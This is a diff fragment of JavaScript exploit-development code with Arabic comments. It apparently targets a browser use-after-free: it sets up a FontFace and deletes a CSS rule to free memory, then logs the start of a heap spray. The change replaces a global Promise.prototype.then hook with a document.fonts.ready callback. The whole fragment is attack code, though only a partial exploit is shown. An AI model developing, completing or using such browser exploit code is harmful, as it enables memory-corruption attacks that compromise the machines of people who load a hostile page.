@@ -27,15 +27,11 @@
             let A = new FontFace('targetFont', 'url(https://invalid.url)', { unicodeRange: 'U+0041' });
             
             // استبدل الـ Hook القديم بهذا:
-const originalThen = Promise.prototype.then;
-Promise.prototype.then = function(onFulfilled, onRejected) {
-    // نتحقق إذا كان هذا الوعد يخص كائن FontFace الخاص بنا
-    // إذا كنت لا تستطيع معرفة الكائن، سنقوم بـ Hook عام للتجربة فقط
-    log("Promise intercepted...");
-    return originalThen.call(this, onFulfilled, onRejected);
-};
+                    // بدلاً من الـ Hook، استخدم هذا:
+document.fonts.ready.then(() => {
+    log("Fonts ready state triggered!");
+});
 
-                    
                         // تنفيذ التحرير
                         document.getElementById('s').sheet.deleteRule(0);
                         log("--- Rule deleted. Starting Heap Spray ---");
